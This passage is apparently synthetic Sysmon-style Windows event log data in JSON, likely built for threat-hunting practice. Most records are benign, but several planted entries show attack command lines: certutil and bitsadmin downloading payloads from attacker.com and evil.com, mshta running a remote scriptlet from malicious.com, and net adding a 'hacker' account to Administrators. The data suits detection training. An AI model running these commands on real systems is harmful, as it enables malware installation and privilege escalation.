  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "alice",
    "UtcTime": "2024-03-04T23:25:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3251",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=622065d6ccd8e889783d7e21b3482046ef909213064881dd1337ddb61c2d509b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T09:49:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1956",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e256a23599684b67a44ea980ebea5378ec2747d99ef89bf79e78208bd97f22a0"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-02T09:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.244",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.200",
      "SourcePort": "61385"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-10T07:46:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.72",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.117",
      "SourcePort": "59518"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "charlie",
    "UtcTime": "2024-03-07T21:07:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "4357",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=beb1b54267274dc9074faad90aeaa883b899d5ca75ef48d9466edf265e2922c2"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-16T15:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.176",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.48",
      "SourcePort": "52132"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "dave",
    "UtcTime": "2024-03-11T00:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "7532",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=34f9f4541407a76fba0ec2124df70a436f818ef0c8de6d3cf44423a71d1650c6"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-20T10:59:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "3180",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=bf527ab06722c773ae90ff672b0a07044a5a6ab845841693dc28c9ed5f5aecdf"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "dave",
    "UtcTime": "2024-03-11T14:10:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "2427",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=34921cc2d99c13a8f0be386dbe7ae95493a1b56d1eeb0549a3fb8b4efa041dc7"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-12T19:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.91",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.61",
      "SourcePort": "56749"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-22T08:29:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4270",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=36132931bdfbd482fbdf34e06055ed26a90a26e5f003e6a688dcd74a4721f996"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T08:20:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -enc ZQBjAGgAbwAgAEgAZQBsAGwAbwAgAFcAbwByAGwAZAA=",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6190",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f1c94ee4d359e130f1cb2d6b9ec9aa58ba9fe64056bef95b8b10d22e6d526f46"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
    "UtcTime": "2024-03-04T10:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "1101",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4135254b12ebf1a4798937e561138df5caceb3caaccffe5e5e8c5c5f6be85e0c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-21T23:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "6664",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9dd79e694d07c352bf00cd6392a3e899e231b9668e59df82ae08b90ec5d41017"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-20T12:06:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6074",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=445bc48e8731182f20632e7b599b4e0d99147cc8b3b28da55e09014738e8da80"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "alice",
    "UtcTime": "2024-03-11T21:00:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5364",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e12e8b18d01da0cd3d86d324283a20b5ee2521d99bd49ae1a33bf49a841e3927"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "bob",
    "UtcTime": "2024-03-23T15:22:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7919",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=feb8e770cb92f471727c8df433a705f4f6fb2a8b06c78eee04f9821fbdb7e296"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "administrator",
    "UtcTime": "2024-03-12T07:26:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3273",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5c079f822b7b791776596cf5ee59443137eeee2a57cfd8a097f6dd1fce0d419b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "dave",
    "UtcTime": "2024-03-18T10:54:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "2619",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cf4619f7ff77fd69eea715e2d03303ee6275453f9f42def81cff03a4499d48fc"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T11:20:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "CommandLine": "certutil.exe -urlcache -split -f http://attacker.com/malware.exe malware.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "5656",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=02b348f9a69605b9ba11ed8e1efd673c755a299e4b0ee324628bbda2f4dc527b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-01T12:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\net.exe",
      "CommandLine": "net localgroup Administrators hacker /add",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "4646",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8430e8264af0750d02b7ac1251dcb31ee1ab5bd0fab208805e75fda3197e3f2b"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-18T21:57:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.99",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.70",
      "SourcePort": "51130"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "dave",
    "UtcTime": "2024-03-07T23:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "5915",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=65caf5a1eb67db8e865f1fbba8f25043c080eaee1f30a38a03ab1007c8337529"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-04T08:02:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "8498",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f5f1f6ded8ae90b68d6ac14f78842b694040a98a2a8f93ee336a195a25d4b937"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-03T16:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "8529",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c7a79dff2625bcca2755b54893b99a940aa6e52ed2348780d85ce6f8ec909439"
    }
  },
  {
    "EventID": 3,
    "Computer": "SERVER-02",
    "UtcTime": "2024-03-09T11:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.69",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.136",
      "SourcePort": "58870"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "bob",
    "UtcTime": "2024-03-16T16:26:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3557",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=40b168cf69b7f07d69816d8a2e1b183732f9060d481bbd512e0edbd13ce7b607"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "administrator",
    "UtcTime": "2024-03-24T03:43:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "6831",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e1436b58065625bf4632b08df4ca276b7bd58dc83f083ded3787b0e384bdc6a2"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-10T15:37:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "8585",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=65a6e649bc04fca560d2e4b2d2c08326a10a431335f9ca4a25ffd55f9f55f679"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-07T22:57:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "DestinationIp": "10.0.0.126",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.51",
      "SourcePort": "63186"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-26T10:41:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.32",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.100",
      "SourcePort": "52433"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "alice",
    "UtcTime": "2024-03-06T12:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "2855",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f1c33579de8b3b8f621af2119d32057d628fb2d621037c5ab2d304186a7d6b3a"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-07",
    "UtcTime": "2024-03-20T14:38:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.193",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.176",
      "SourcePort": "62257"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-09T04:36:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "6174",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f72ea633022d3c00a165da08e6051310e49f7ba1da1343b7777f82974c9a225b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-13T09:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "3007",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=92c1cb56a3606d335286b92cb78717fe88e05bea63e0723519ae8119054bb552"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-11T18:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5342",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b6a3d9ed6f30e18f5c36d528f26323ca4a0416c7203940fc9fb5f39823d6d644"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
    "UtcTime": "2024-03-23T21:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "8337",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5a4a8ff26c5a7a33019435b16d060e3d6ea3a6b40a7966c29edb2bd27f97e23e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "administrator",
    "UtcTime": "2024-03-11T11:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2650",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=7b5ef24805df08ac9d3dce8fc1a979f6cd4237be0afca566da9f0ad40964eb8d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-29T13:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7701",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=83b4fa505265341a71e84bbc974663687501af0e7f86bcafa1926cd0e573d707"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-26T05:43:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.40",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.245",
      "SourcePort": "60375"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-16T05:35:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "DestinationIp": "10.0.0.5",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.120",
      "SourcePort": "57255"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "alice",
    "UtcTime": "2024-03-27T02:09:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "5474",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a18fcd44379cfaa7b186d67d72ef4c6c5b56fc2bb3f5bf194f7de7960255c372"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "bob",
    "UtcTime": "2024-03-01T11:26:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\mshta.exe",
      "CommandLine": "mshta.exe javascript:a=GetObject('script:http://malicious.com/vbs.sct').Exec();close()",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5982",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f5f036d13d88b916db490049604ece59c356bbe79b1a45ef3a79a23f10234160"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "alice",
    "UtcTime": "2024-03-26T03:06:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "7606",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c78ffc4aa752c01913a8298bf54618106cde0e77d45b9681f7a01d76617fdcff"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-23T12:40:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.130",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.130",
      "SourcePort": "50049"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-25T18:14:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9344",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=46f450f8265fe9b2e99e4c221f9ee8dfe6ed38055c6e6c1502a438c73b0af5b0"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-06",
    "UtcTime": "2024-03-11T19:41:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "DestinationIp": "10.0.0.158",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.191",
      "SourcePort": "60899"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-27T07:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.28",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.193",
      "SourcePort": "54030"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-19T03:33:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6572",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a508ee69a56ab614b87ecae7831619f75669f06f95fcb68621aece8abca264e3"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-09T07:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "5080",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0d224d7920fe727345cdff30d6f44710372cfae4a7fd6153d2e25c96000bc907"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-22T06:22:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.26",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.75",
      "SourcePort": "59499"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "charlie",
    "UtcTime": "2024-03-27T06:39:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1947",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c074323fa729dd0f72178a41fc512a10aaeb900d930890f8fe2c43d684315423"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "bob",
    "UtcTime": "2024-03-08T21:55:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "5766",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f826109a1ce5fa31e6010d1a4a0e985d401bbdb590fe57a7daea367404d97a1e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T11:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "CommandLine": "bitsadmin.exe /transfer backdoor /download /priority foreground http://evil.com/payload.exe C:\\Users\\Public\\payload.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9251",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=873195a13ef7fca66ee3722fe0fc2cc8146f8afbff6066d90eb9922da688c063"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-18T16:23:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.23",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.63",
      "SourcePort": "61826"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-10T18:19:00Z",
    "EventData": {
      "SubjectUserName": "alice",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-11T12:14:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "3745",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=684161665a211edc08be776a0d11c03e07f76a2664e5c2eb5d12b75f55eca882"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "dave",
    "UtcTime": "2024-03-15T16:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9327",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1051ebb4e95dfffe39bfde8057a47a1179fed913db2de4ed2dee44651465929b"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-07T21:04:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1746",
      "IntegrityLevel": "High",
